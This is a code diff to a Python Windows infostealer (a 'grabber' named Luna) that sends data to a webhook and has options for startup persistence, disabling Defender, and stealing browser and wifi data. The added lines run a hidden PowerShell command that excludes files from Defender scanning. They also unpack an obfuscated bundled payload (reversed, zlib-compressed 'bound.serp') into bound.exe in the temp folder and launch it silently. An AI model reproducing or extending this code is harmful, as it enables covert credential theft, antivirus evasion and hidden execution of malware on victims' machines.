@@ -4,17 +4,21 @@ import json
 import os
 import random
 import requests
+import subprocess
 import sys
+import zlib
 from multiprocessing import cpu_count
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from zipfile import ZIP_DEFLATED, ZipFile
-
+print("HELLO FROM ZE GRAB")
 
 #global variables
 temp = os.getenv("temp")
 temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
 os.mkdir(temp_path)
 localappdata = os.getenv("localappdata")
+if not hasattr(sys, "_MEIPASS"):
+    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))
 
 
 def main(webhook: str):
@@ -25,7 +29,7 @@ def main(webhook: str):
     if __CONFIG__["startup"]:
         threads.append(Startup)
     if __CONFIG__["defender"]:
-        threads.append(disable_defender)
+        threads.append(Defender)
     if __CONFIG__["browser"]:
         threads.append(Browsers)
     if __CONFIG__["wifi"]:
@@ -90,21 +94,48 @@ def main(webhook: str):
 
 
 def Luna(webhook: str):
+    def GetSelf() -> tuple[str, bool]:
+        if hasattr(sys, "frozen"):
+            return (sys.argv[0], True)
+        else:
+            return (__file__, False)    
+
+    def ExcludeFromDefender(path) -> None: # Tries to exclude a file or folder from defender's scan
+        if __CONFIG__["defender"]:
+            subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+        
     def IsConnectedToInternet() -> bool: # Checks if the user is connected to internet
         try:
             return requests.get("https://gstatic.com/generate_204").status_code == 204
         except Exception:
             return False
     if not IsConnectedToInternet():
-        if not __Config__["startup"]:
+        if not __CONFIG__["startup"]:
             os._exit(0)
 
-    def CreateMutex(mutex: str = "Your Mom") -> bool:
+    def CreateMutex(mutex: str) -> bool:
         kernel32 = ctypes.windll.kernel32
         mutex = kernel32.CreateMutexA(None, False, mutex)
         return kernel32.GetLastError() != 183
-    if not CreateMutex():
+    if not CreateMutex(__CONFIG__["mutex"]):
         os._exit(0)
+        
+
+    path, isExecutable = GetSelf()
+    inStartup = os.path.basename(os.path.dirname(path)).lower() == "startup"
+    if isExecutable and (__CONFIG__["bound_startup"] or not inStartup) and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.serp")):
+        if os.path.isfile(boundFileDst:= os.path.join(os.getenv("temp"), "bound.exe")):
+            os.remove(boundFileDst)
+        with open(boundFileSrc, "rb") as f:
+            content = f.read()
+        decrypted = zlib.decompress(content[::-1])
+        with open(boundFileDst, "wb") as f:
+            f.write(decrypted)
+        del content, decrypted
+                  
+        ExcludeFromDefender(boundFileDst)
+        subprocess.Popen("start bound.exe", shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+        
 
     if __CONFIG__["anti_spam"]:
         AntiSpam()
